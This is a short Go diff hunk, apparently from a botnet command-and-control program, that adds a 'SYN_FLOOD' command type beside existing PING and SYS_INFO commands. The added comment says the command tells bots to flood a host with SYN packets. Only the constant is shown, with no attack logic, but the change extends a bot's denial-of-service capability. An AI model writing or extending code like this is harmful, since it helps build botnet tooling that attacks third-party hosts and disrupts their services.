@@ -31,6 +31,8 @@ var (
 	CommandTypePing = CommandType("PING")
 	// CommandTypeSysInfo requests system information from bots
 	CommandTypeSysInfo = CommandType("SYS_INFO")
+	// CommandTypeSynflood requests a bot to flood a host with SYN packets
+	CommandTypeSynflood = CommandType("SYN_FLOOD")
 	/*
 	 * add command types here
 	 */
